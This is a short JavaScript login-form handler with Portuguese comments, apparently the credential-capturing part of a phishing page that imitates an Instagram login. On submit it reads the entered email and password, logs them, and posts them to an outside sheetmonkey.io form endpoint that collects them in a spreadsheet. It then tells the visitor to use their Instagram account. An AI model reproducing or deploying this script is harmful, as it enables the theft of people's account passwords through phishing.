var monkey = (event) => {
    event.preventDefault();
    
    var email = document.getElementById('iemail')
    var senha = document.getElementById('isenha')
    email.style.border='solid 1px red'
    senha.style.border='solid 1px red'

    var email2 = email.value;
    var senha2 = senha.value;

    var letraE = String(email2).length;
    var letraS = String(senha2).length;

    if (letraE > 1 && letraS > 1) {
        console.log(email2, senha2);

        fetch('https://api.sheetmonkey.io/form/aMg4Fau8yyiKVsRUqCSS8N', {
            method: 'post',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email: email2, senha: senha2 })  // Corrigido aqui
        })
        .then(response => response.json())  // Tratar a resposta (opcional)
        .then(data => console.log(data))
        .catch(error => console.error('Erro:', error));
    }
    alert('Use a conta do instagram...')
}

document.querySelector('form').addEventListener('submit', monkey);
